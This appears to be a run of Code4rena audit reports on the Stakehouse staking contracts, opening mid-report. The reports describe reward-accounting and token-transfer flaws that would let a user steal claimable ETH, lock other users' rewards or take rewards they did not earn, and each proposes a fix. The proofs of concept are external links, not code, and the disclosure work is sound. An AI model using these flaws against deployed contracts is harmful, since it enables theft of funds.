ok. 1 passed; 0 failed; finished in 9.25ms ```  To run with full trace, execute: `yarn test -m "PreventWithdraw" -vvvv`  ## Tools Used  VS Code, Foundry  ## Recommended Mitigation Steps  Make sure transfers in the GiantLP are only for funds larger than (0.001 ETH), this will make the exploitation expensive.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L369 https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L668 https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L228   # Vulnerability details  ## Impact  A malicious user can steal all claimable ETH belonging to free floating SLOT holders...  ## Proof of Concept  https://gist.github.com/clems4ever/f1149743897b2620eab0734f88208603  run it in the test suite with forge  ## Tools Used  Manual review / forge  ## Recommended Mitigation Steps  += operator instead of =    in https://github.com/code-423n4/2022-11-stakehouse/blob/39a3a84615725b7b2ce296861352117793e4c853/contracts/syndicate/Syndicate.sol#L228 ?  The logic for keeping the rewards up-to-date is also quite complex in my opinion. The main thing that triggered it for me was the lazy call to `updateAccruedETHPerShares`. Why not keeping the state updated after each operation instead?
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L172 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantLP.sol#L8   # Vulnerability details  ## Impact Any malicious user could make the rewards in GiantMevAndFeesPool inaccessible to all other users...  ## Proof of Concept  https://gist.github.com/clems4ever/9b05391cc2192c1b6e8178faa38dfe41  Copy the file in the test suite and run the test.  ## Tools Used  forge test  ## Recommended Mitigation Steps  Protect the inherited functions of the ERC20 tokens (GiantLP and LPToken) because `transfer` is not protected and can trigger the `before` and `after` hooks. There is the same issue with LPToken and StakingFundsVault.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L85 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L61 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L203   # Vulnerability details  ## Impact Any user being the first to claim rewards from GiantMevAndFeesPool, can get all the previously generated rewards whatever the amount and even if he did not participate to generate those rewards...  ## Proof of Concept  https://gist.github.com/clems4ever/c9fe06ce454ff6c4124f4bd29d3598de  Copy paste it in the test suite and run it.  ## Tools Used  forge test  ## Recommended Mitigation Steps  Rework the way `accumulatedETHPerLPShare` and `claimed` is used. There are multiple bugs due to the interaction between those variables as you will see in my other reports.
